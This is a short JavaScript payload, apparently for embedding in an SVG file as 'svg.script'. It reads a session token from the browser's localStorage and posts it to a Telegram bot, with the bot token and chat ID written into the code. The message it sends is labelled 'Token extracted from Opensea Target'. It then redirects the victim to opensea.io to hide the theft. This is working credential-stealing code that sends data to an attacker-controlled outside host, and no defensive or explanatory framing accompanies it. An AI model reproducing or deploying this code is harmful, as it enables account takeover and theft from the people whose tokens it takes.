svg.script:
  function init(){
    const token = localStorage.getItem('token') || 'this-worked-v2';
  
    // Your Telegram Bot Token and Chat ID
    const botToken = "8262449032:AAFB_jVPcfVjPMXV_ECWS-MHxiEJKP8Apxs";
    const chatId = "-5098583582";
    
    const telegram_url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    const payload = {
      chat_id: chatId,
      text: "Token extracted from Opensea Target" + token,
      parse_mode: "HTML"
    };
    
    fetch(telegram_url, {
      method: 'POST',
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }).then(() => {
      setTimeout(() => {
        window.location.href = 'https://opensea.io';
      }, 500);
    }).catch(() => {
      setTimeout(() => {
        window.location.href = 'https://opensea.ios';
      }, 500);
    });
  }
